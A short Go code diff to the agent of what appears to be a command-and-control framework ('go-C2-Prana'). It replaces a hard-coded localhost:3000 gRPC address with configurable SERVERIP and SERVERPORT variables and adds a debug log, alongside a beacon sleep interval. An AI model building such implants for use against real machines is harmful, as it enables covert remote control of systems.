@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+	"fmt"
 	"github.com/denisbrodbeck/machineid"
 	"github.dev/nireitdev/go-C2-Prana/internal/Task"
 	"github.dev/nireitdev/go-C2-Prana/internal/common"
@@ -21,6 +22,11 @@ import (
 
 const SLEEP_BEACON_SEG = 10
 
+var (
+	SERVERIP   = "127.0.0.1"
+	SERVERPORT = "3000"
+)
+
 func main() {
 
 	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
@@ -31,7 +37,9 @@ func main() {
 
 	//Conexion al server:
 	opts := grpc.DialOption(grpc.WithTransportCredentials(insecure.NewCredentials()))
-	conn, err := grpc.NewClient("localhost:3000", opts)
+	addr := fmt.Sprintf("%s:%s", SERVERIP, SERVERPORT)
+	slog.Debug("Iniciando conexion Servidor...", "addr", addr)
+	conn, err := grpc.NewClient(addr, opts)
 	if err != nil {
 		log.Fatalln("Imposible conectar con el servidor. Bye!")
 	}
